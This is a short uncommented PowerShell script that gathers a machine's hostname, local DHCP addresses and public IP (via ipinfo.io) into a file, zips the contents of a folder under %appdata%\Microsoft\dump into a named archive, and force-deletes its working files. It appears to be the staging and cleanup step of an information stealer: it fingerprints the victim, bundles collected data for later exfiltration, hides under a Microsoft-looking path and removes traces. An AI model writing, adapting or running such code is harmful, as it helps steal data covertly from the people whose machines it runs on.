param (
    [Parameter()]
    [String]$dump_file_name
)

mkdir meta_data ; Set-Location meta_data
$command = {hostname; Get-NetIpaddress | Where PrefixOrigin -EQ DHCP; Invoke-RestMethod http://ipinfo.io/json | Select -exp ip}
$command.InvokeReturnAsIs() | Out-File .\meta-data.txt

Set-Location ..
Compress-Archive -Path * -DestinationPath "$dump_file_name"
Remove-Item -Path "$env:appdata\Microsoft\dump\meta_data" -recurse -Force